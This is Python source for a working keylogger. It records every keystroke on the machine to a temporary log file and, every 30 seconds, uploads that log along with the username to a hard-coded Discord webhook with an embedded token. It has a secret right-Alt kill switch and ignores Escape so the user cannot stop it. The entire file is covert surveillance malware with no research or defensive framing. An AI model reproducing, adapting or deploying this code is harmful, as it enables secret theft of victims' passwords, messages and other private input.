import os
import tempfile
import requests
import threading
import getpass
from pynput import keyboard

# Get the name of the user signed in
user_name = getpass.getuser()

# Create a temporary directory and a log file named "log.txt" within it
temp_dir = tempfile.gettempdir()
log_path = os.path.join(temp_dir, 'log.txt')

# Create and initialize the log file
with open(log_path, 'w') as log_file:
    log_file.write('')

# Your Discord webhook URL
webhook_url = 'https://discord.com/api/webhooks/1272625926668292136/LL8hTxV9YTcY6Qkbc_KZhn2BXVufmLDGAbM0m1m28kbK8cvwlcakiwViAQtrMKO_BA95'

# Initialize the idle time counter starting at 30 seconds
idle_time = 30

# Variables to track the state of the right Alt key and the timer
right_alt_pressed = False
alt_timer = None

# Function to handle key press events
def on_press(key):
    global idle_time, right_alt_pressed, alt_timer
    idle_time = 30  # Reset idle time to 30 seconds on key press
    try:
        with open(log_path, 'a') as f:
            f.write(f'{key.char}')
    except AttributeError:
        with open(log_path, 'a') as f:
            if key == keyboard.Key.space:
                f.write(' ')
            elif key == keyboard.Key.enter:
                f.write('\n')
            else:
                f.write(f'[{key}]')

    # Check for right Alt key press
    if key == keyboard.Key.alt_r:
        right_alt_pressed = True
        if alt_timer is None:
            alt_timer = threading.Timer(5, stop_keylogger)
            alt_timer.start()

# Function to handle key release events (optional)
def on_release(key):
    global right_alt_pressed, alt_timer
    if key == keyboard.Key.esc:
        # Ignore the Escape key to prevent stopping the listener
        return

    # Check for right Alt key release
    if key == keyboard.Key.alt_r:
        right_alt_pressed = False
        if alt_timer is not None:
            alt_timer.cancel()
            alt_timer = None

# Function to stop the keylogger
def stop_keylogger():
    print('Right Alt key held for 5 seconds. Stopping keylogger...')
    os._exit(0)

# Function to send the log file to Discord
def send_log_to_discord():
    global idle_time
    try:
        if os.path.getsize(log_path) == 0:
            message = f"Nothing typed in {idle_time} seconds by {user_name}"
            data = {
                "content": message
            }
            response = requests.post(webhook_url, json=data)
            if response.status_code == 200:
                print('Idle message sent successfully.')
            else:
                print(f'Failed to send idle message. Status code: {response.status_code}')
            idle_time += 30
        else:
            with open(log_path, 'rb') as f:
                files = {
                    'file': (os.path.basename(log_path), f)
                }
                response = requests.post(webhook_url, files=files)
                if response.status_code == 200:
                    print('Log file sent successfully.')
                else:
                    print(f'Failed to send log file. Status code: {response.status_code}')
            # Clear the log file
            open(log_path, 'w').close()
            idle_time = 30  # Reset idle time to 30 seconds after sending log

        # Schedule the next call to this function
        threading.Timer(30, send_log_to_discord).start()
    except RuntimeError as e:
        if 'interpreter shutdown' in str(e):
            print('Interpreter is shutting down, cannot start new thread.')
        else:
            raise

# Start the keyboard listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    # Schedule the first log sending after 30 seconds
    threading.Timer(30, send_log_to_discord).start()
    listener.join()

# Print the path to the temporary file
print(f'Keystrokes are being logged to: {log_path}')
